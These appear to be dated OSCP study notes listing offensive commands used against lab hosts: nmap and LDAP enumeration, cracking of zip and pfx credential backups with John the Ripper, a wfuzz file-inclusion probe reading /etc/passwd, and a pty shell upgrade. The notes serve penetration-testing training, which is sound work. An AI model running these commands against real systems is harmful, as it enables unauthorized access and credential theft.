### 26082023Sat

[OSCP - How to Take Effective Notes](https://youtu.be/yYmDQY1zKKE?list=PLDrNMcTNhhYqZU1ySROli7Oc08mxe1tZR)

https://www.youtube.com/@c0nd4

```
nmap -p- -sC -sV -oA tcp_all_ports 192.168.1.73
```

```
searchsploit moinmoin
```

![[Pasted image 20230826195512.png]]

```
python3 -m http.server 80
```

```
bash LinEnum.sh
```

### 27082023Sun

```
shutdown /r /t 0
```

```
shutdown -r -t 0
```

```
nmap -p389 192.168.237.103 --script=ldap-search
```
![[Pasted image 20230827215712.png]]

```
ldapsearch -x -b "dc=cybex,dc=nz" -H ldap://192.168.237.103
```

```
ldapsearch -x -b "dc=ldap.forumsys,dc=com" -H ldap://192.168.237.103
```

```
nmap -p 389 192.168.237.103 --script=ldap-search --script-args="ldap.username-creatigon"
```

```
nmap -p- -sC -sV -Pn 10.129.227.113
```

```
zip2john winrm_backup.zip > zipHash.john
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt zipHash.john
```

```
pfx2john legacyy_dev_auth.pfx > pfxHash.john
```

```
wfuzz -u http://192.168.237.104/file.php?FUZZ=/etc/passwd --hw 14 -w /usr/share/wordlists/dirb/big.txt
```

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

